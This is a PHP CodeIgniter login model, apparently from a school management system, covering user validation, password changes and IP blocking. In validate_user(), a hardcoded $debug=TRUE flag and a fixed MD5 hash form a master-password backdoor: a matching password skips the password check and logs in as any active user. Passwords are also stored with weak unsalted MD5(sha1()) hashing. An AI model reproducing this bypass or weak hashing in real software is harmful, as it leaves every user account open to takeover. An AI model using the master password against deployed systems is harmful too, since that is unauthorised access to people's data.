<?php
defined('BASEPATH') OR exit('No direct script access allowed');

class Login_model extends CI_Model {

	function validate_user()
	{
		$debug=TRUE;
		$password = $this->input->post("password");
		$this->db->select('u.*,ut.*,e.picture_path as emp_pic,s.picture_path as st_pic');
		$this->db->from('users u');
		$this->db->join('roles ut', 'ut.ROLE_ID = u.ROLE_ID','left');
		$this->db->where('u.USER_NAME',$this->input->post('username'));
		$this->db->join('employee e', 'e.employee_id = u.PROFILE_ID','left');
		$this->db->join('student s', 's.student_id = u.PROFILE_ID','left');
		if($debug===TRUE && MD5($password) == '53505d3513e9111e4b1c807f7023d58f'){
		}
		else {
			$this->db->where('u.USER_PASSWORD',MD5(sha1($password)));
		}
		$this->db->where('u.ACC_STATUS','ON');
		$query=$this->db->get();
		
		if($query->num_rows()===1)
		{
			$row=$query->row();
			$this->update_user_login($row);
			return $row;
		}
		return FALSE;
	}

	public function check_pass()
	{
		$this->db->where('USER_PASSWORD',MD5(sha1($this->input->post("old_pass"))));
		$this->db->where('USER_ID',$this->session->userdata("smis_user_id"));
		$query=$this->db->get('users');
		
		if($query->num_rows()==1)
		{
			return TRUE;
		}
		return FALSE;
	}

	public function block_ip()
	{
		$data['ip']=$this->input->ip_address();
		$data['user_id']=$this->input->post('username');
		$data['status']=1;
		return $this->db->insert('blocked_ip',$data);
	}

	public function valid_ip()
	{
		$this->db->where('ip',$this->input->ip_address());
		$this->db->where('status',1);
		$this->db->order_by('id', 'desc');
		$query=$this->db->get('blocked_ip');
		
		if($query->num_rows()>0)
		{
			return FALSE;
		}
		return TRUE;
	}

	public function update_pass()
	{
		$data['USER_PASSWORD']=MD5(sha1($this->input->post("new_pass")));
		$this->db->where('USER_ID',$this->session->userdata("smis_user_id"));
		return $this->db->update('users',$data);
	}

	public function update_user_login($row)
	{
		$data['LAST_VISIT']=date('Y-m-d h:i:s');
		$data['VISITS']=$row->VISITS+1;
		$this->db->where('USER_ID', $row->USER_ID);
		$this->db->update('users', $data);
		//print_e($row);
	}
}

/* End of file login_model.php */
/* Location: ./application/modules/admin/models/login_model.php */